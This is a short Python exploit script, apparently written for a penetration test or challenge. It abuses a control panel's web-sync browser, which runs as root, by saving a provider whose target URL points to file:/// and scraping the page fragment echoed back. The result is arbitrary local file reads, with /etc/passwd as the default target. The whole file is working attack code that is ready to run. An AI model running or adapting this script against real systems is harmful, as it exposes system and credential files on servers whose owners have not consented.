"""Read arbitrary local files on TARGET_IP via the web-sync browser (runs as root).

The control panel's "网页登录同步" feature loads web_target_url in a server-side
browser and echoes a fragment of the page text into the sync result. Pointing it
at file:/// turns that into arbitrary file read as root.

Usage:  python3 fileread.py <file-or-url> [ip_regex]
"""
import urllib.request, urllib.parse, re, sys, time, html as htmlmod

BASE = "http://TARGET_IP:5002"
PROVIDER_ID = "2"


def get(p):
    return urllib.request.urlopen(BASE + p, timeout=60).read().decode("utf-8", "replace")


def post(p, data):
    d = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(BASE + p, data=d, method="POST",
                                 headers={"Content-Type": "application/x-www-form-urlencoded",
                                          "User-Agent": "Mozilla/5.0"})
    return urllib.request.urlopen(req, timeout=180).read().decode("utf-8", "replace")


def set_target(url, ip_regex=""):
    data = {
        "provider_id": PROVIDER_ID, "name": "zzprobe-file", "web_enabled": "1",
        "login_url": url, "web_target_url": url, "web_mode": "cookie",
        "username": "", "password": "", "web_wait_selector": "", "web_cookie": "",
        "web_user_selector": "", "web_pass_selector": "", "web_submit_selector": "",
        "resource_name_regex": "", "ip_regex": ip_regex, "expire_regex": "",
        "total_regex": "", "used_regex": "", "remain_regex": "", "remark": "probe",
    }
    post("/web-sync/provider-save", data)


def extract():
    """Return (status, result_text) for the probe row only."""
    h = get("/web-sync")
    # isolate the probe <tr>
    m = re.search(r"<tr>(?:(?!</tr>).)*?zzprobe-file(?:(?!</tr>).)*?</tr>", h, re.S)
    if not m:
        return None, None
    row = m.group(0)
    tds = re.findall(r'<td[^>]*>(.*?)</td>', row, re.S)
    status = re.sub(r"<[^>]+>", "", tds[3]).strip() if len(tds) > 3 else "?"
    result = htmlmod.unescape(re.sub(r"<[^>]+>", "", tds[6])).strip() if len(tds) > 6 else ""
    return status, result


def read(target, ip_regex="", wait=1.5):
    set_target(target, ip_regex)
    trigger()
    time.sleep(wait)
    st, res = extract()
    frag = ""
    mm = re.search(r"页面片段：(.*)$", res, re.S)
    if mm:
        frag = mm.group(1).strip()
    return st, res, frag


def trigger():
    post("/web-sync/%s" % PROVIDER_ID, {})


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "file:///etc/passwd"
    rx = sys.argv[2] if len(sys.argv) > 2 else ""
    st, res, frag = read(target, rx)
    print("=== %s ===" % target)
    print("status:", st)
    print("result (%d chars):" % len(res)); print(res)
    print("--- fragment (%d chars) ---" % len(frag))
    print(frag)
